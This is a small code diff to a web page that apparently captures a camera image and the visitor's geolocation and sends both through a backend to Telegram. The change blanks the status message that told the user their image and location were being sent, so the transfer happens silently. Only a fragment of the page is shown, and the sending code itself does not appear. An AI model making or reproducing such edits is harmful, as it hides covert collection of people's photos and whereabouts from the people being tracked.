@@ -184,7 +184,7 @@
         locationText.textContent =
           `Lat: ${loc.lat.toFixed(5)}, Lng: ${loc.lng.toFixed(5)} (±${Math.round(loc.acc)}m)`;
         locationBox.classList.remove("hidden");
-        statusText.textContent = "Image & location captured. Sending to Telegram...";
+        statusText.textContent = "";
 
         // 4) send to backend → Telegram
         await sendToServer(imageBase64, loc);
@@ -200,4 +200,5 @@
   </script>
 </body>
 </html>
+
 
